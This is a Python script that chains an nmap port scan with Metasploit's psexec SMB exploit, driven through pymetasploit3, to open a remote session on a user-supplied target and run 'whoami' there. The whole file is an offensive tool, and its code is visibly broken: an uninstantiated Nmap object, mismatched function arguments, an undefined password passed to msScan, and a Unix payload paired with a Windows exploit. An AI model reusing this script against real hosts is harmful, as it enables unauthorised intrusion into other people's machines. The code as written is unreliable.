import nmap3
import pymetasploit3
from pymetasploit3.msfrpc import MsfRpcClient
from subprocess import Popen
  
def main():
    print("********Tool name********")
    passwd = input("Enter password: ")
    host = input("Enter host IP: ")
    target = input("Enter target ip or domain name: ")
    
    #call nmap scan
    nmap_results = nmapScan(host, target, passwd)###
    print(nmap_results)
    
    #call metasploit scan
    msScan(target)
    
def nmapScan(host, target, passwd):
    #port scan target
    nmap = nmap3.Nmap
    nmap_results = nmap.scan_top_ports(host, target)
    
    #Send results to text file (for later logs)
    with open('output.txt', 'w') as f:
        print(nmap_results, file=f)
        
    return nmap_results

def msScan(target, passwd):
    #Connect to msfrpcd server
    Popen('msfrpcd -P ' + passwd)
    client = MsfRpcClient(passwd)
    
    #Set exploit and target
    exploit = client.module.use("exploit/windows/smb/psexec")
    exploit['RHOST'] = target
    
    #Execute payload
    exploit.execute(payload="cmd/unix/interact")

    #Find/list available sessions
    print("Availible Sessions: ")
    for s in client.sessions.list.keys():
        print(s)

    #Get a shell object
    shell = client.sessions.session(list(client.sessions.list.keys())[0])

    #Write to the shell
    shell.write('whoami')

    #Print the output
    print(shell.read())

    #Stop the shell
    shell.stop()
   
main()